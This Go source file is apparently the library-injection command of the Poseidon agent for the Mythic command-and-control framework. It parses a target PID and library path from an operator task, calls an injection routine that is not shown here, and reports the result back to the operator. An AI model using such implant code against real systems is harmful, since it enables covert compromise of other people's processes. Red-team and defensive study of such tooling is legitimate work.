package libinject

import (
	// Standard
	"encoding/json"
	"fmt"

	// Poseidon

	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/structs"
)

// Inject C source taken from: http://www.newosxbook.com/src.jl?tree=listings&file=inject.c
type Injection interface {
	TargetPid() int
	Shellcode() []byte
	Success() bool
	SharedLib() string
}

type Arguments struct {
	PID         int
	LibraryPath string
}

func (e *Arguments) UnmarshalJSON(data []byte) error {
	alias := map[string]interface{}{}
	err := json.Unmarshal(data, &alias)
	if err != nil {
		return err
	}
	if v, ok := alias["pid"]; ok {
		e.PID = int(v.(float64))
	}
	if v, ok := alias["library"]; ok {
		e.LibraryPath = v.(string)
	}
	return nil
}

func Run(task structs.Task) {
	msg := task.NewResponse()

	args := Arguments{}
	err := json.Unmarshal([]byte(task.Params), &args)

	if err != nil {
		msg.SetError(err.Error())
		task.Job.SendResponses <- msg
		return
	}
	result, err := injectLibrary(args.PID, args.LibraryPath)
	if err != nil {
		msg.SetError(err.Error())
		task.Job.SendResponses <- msg
		return
	}

	if result.Success() {
		msg.UserOutput = fmt.Sprintf("Successfully injected %s into pid: %d ", args.LibraryPath, args.PID)
	} else {
		msg.UserOutput = fmt.Sprintf("Failed to inject %s into pid: %d ", args.LibraryPath, args.PID)
	}

	msg.Completed = true
	task.Job.SendResponses <- msg
	return
}
